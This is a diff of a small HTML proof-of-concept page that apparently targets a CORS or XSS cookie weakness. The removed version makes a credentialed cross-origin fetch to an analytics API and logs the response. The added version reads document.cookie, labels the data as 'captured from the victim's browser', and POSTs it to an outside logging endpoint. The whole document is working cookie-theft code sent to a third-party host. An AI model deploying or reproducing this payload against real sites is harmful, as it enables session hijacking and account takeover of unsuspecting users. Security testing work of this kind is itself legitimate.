@@ -1,40 +1,39 @@
-<html>
-  <body>
-    <script>
-      fetch("https://api.segment.io/v1/p", {
-        method: "GET",
-        credentials: "include", // Includes cookies
-        headers: {
-          "Origin": "https://varad4-0-4.github.io/covid19partnersplatform-dev/"
-        }
-      })
-      .then(response => response.text())
-      .then(data => {
-        console.log(data); // Logs sensitive data
-      });
-    </script>
-  </body>
-</html>
 <!DOCTYPE html>
 <html>
   <body>
     <script>
-      // Extract cookies
+      // Collect cookies from the document
       const cookies = document.cookie;
 
-      // Send cookies to an attacker's endpoint
-      fetch("https://api.segment.io/v1/p", {
+      // Additional metadata (e.g., custom text or context)
+      const metadata = {
+        message: "This is a test for CORS or XSS cookie vulnerability.",
+        timestamp: new Date().toISOString(),
+        customText: "Cookies have been captured from the victim's browser.",
+      };
+
+      // Construct the data payload
+      const payload = {
+        cookies: cookies || "No cookies found",
+        metadata: metadata,
+      };
+
+      // Send cookies and metadata to your server
+      fetch("https://varad4-0-4.github.io/covid19partnersplatform-dev/log", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
-        body: JSON.stringify({
-          cookies: cookies
-        })
+        body: JSON.stringify(payload),
+      }).then(response => {
+        console.log("Payload sent successfully!");
+      }).catch(err => {
+        console.error("Error sending payload:", err);
       });
     </script>
   </body>
 </html>
+
 
 
 <!-- <!DOCTYPE html>
